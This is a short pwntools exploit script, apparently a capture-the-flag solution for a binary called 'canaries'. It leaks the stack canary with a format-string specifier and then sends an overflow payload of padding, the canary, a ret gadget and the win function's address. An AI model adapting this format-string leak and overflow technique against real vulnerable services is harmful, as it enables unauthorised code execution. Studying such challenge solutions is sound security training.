from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './challenge/canaries'
elf = context.binary = ELF(exe, checksec=False)
p = start()

ret = 0x0000000000401016

p.sendlineafter(b'?', b'%9$016lx')
p.recvuntil(b'is: ')

canary = int(p.recvline(), 16)
info("Leak canary: " + hex(canary))

p.sendlineafter(b'?', flat(
    b'a'*24,
    canary,
    b'a'*8,
    ret,
    elf.sym.win
))

p.interactive()
